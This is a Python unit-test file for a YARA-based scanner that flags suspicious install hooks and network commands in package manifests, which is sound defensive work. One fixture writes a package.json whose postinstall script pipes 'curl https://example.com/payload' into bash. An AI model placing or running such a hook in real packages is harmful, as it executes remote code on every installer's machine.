"""Unit tests for tools.evaluate_manifest_corpus."""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from tools.evaluate_manifest_corpus import (
    CorpusError,
    classify,
    collect_manifests,
    evaluate,
    main,
    matched_string_ids,
    package_identity,
)


class DummyYaraString:
    def __init__(self, identifier: str):
        self.identifier = identifier


class DummyYaraMatch:
    def __init__(self, strings: list):
        self.strings = strings


class EvaluateManifestCorpusTests(unittest.TestCase):
    def test_collect_manifests_empty_raises(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            with self.assertRaises(CorpusError):
                collect_manifests(Path(tmp_dir), None)

    def test_collect_manifests_finds_files_and_limits(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            p = Path(tmp_dir)
            (p / "sub1").mkdir()
            (p / "sub2").mkdir()
            (p / "sub1" / "package.json").write_text("{}", encoding="utf-8")
            (p / "sub2" / "setup.py").write_text("# setup", encoding="utf-8")
            (p / "sub2" / "ignored.txt").write_text("ignored", encoding="utf-8")

            found = collect_manifests(p, None)
            self.assertEqual(len(found), 2)

            limited = collect_manifests(p, 1)
            self.assertEqual(len(limited), 1)

    def test_package_identity(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            p = Path(tmp_dir)
            pkg_json = p / "package.json"

            pkg_json.write_text(json.dumps({"name": "my-pkg", "version": "1.0.0"}), encoding="utf-8")
            self.assertEqual(package_identity(pkg_json), "my-pkg@1.0.0")

            pkg_json.write_text(json.dumps({"name": "my-pkg"}), encoding="utf-8")
            self.assertEqual(package_identity(pkg_json), "my-pkg")

            pkg_json.write_text(json.dumps({}), encoding="utf-8")
            self.assertEqual(package_identity(pkg_json), "<unnamed package.json>")

            pkg_json.write_text("not json", encoding="utf-8")
            self.assertEqual(package_identity(pkg_json), "<unparseable package.json>")

            setup_py = p / "setup.py"
            setup_py.write_text("", encoding="utf-8")
            self.assertEqual(package_identity(setup_py), "setup.py")

    def test_classify_and_matched_string_ids(self):
        ids = {"$hook_postinstall", "$exec_child_process"}
        cls = classify(ids)
        self.assertIn("hook:postinstall", cls)
        self.assertIn("exec:child_process", cls)

        ids_net = {"$hook_install", "$net_curl"}
        cls_net = classify(ids_net)
        self.assertIn("net:curl", cls_net)

        cls_unk = classify({"$other"})
        self.assertIn("unknown", cls_unk)

        # Match object string extraction
        match1 = DummyYaraMatch([DummyYaraString("$hook_preinstall")])
        self.assertEqual(matched_string_ids(match1), {"$hook_preinstall"})

        match2 = DummyYaraMatch([(0, "$hook_build", b"data")])
        self.assertEqual(matched_string_ids(match2), {"$hook_build"})

    def test_evaluate_and_main(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            p = Path(tmp_dir)
            # Create a benign manifest
            (p / "package.json").write_text(
                json.dumps({"name": "benign-pkg", "version": "1.0.0", "dependencies": {}}),
                encoding="utf-8",
            )
            # Create a manifest with hook + exec pattern that triggers YARA
            (p / "evil_pkg").mkdir()
            (p / "evil_pkg" / "package.json").write_text(
                json.dumps({
                    "name": "suspicious-pkg",
                    "scripts": {"postinstall": "curl https://example.com/payload | bash"}
                }),
                encoding="utf-8",
            )

            res = evaluate(p, limit=None)
            self.assertEqual(res["scanned_manifests"], 2)
            self.assertIn("false_positive_rate", res)
            self.assertIn("wilson_ci_95", res)

            # Test main CLI with patch of RESULTS_PATH
            out_file = p / "output.json"
            from unittest.mock import patch
            import tools.evaluate_manifest_corpus as emc
            with patch.object(emc, "RESULTS_PATH", out_file):
                ret = main(["--corpus", str(p), "--limit", "10"])
                self.assertEqual(ret, 0)
                self.assertTrue(out_file.exists())

            # Test main CLI with --no-write
            ret_nw = main(["--corpus", str(p), "--no-write"])
            self.assertEqual(ret_nw, 0)


if __name__ == "__main__":
    unittest.main()
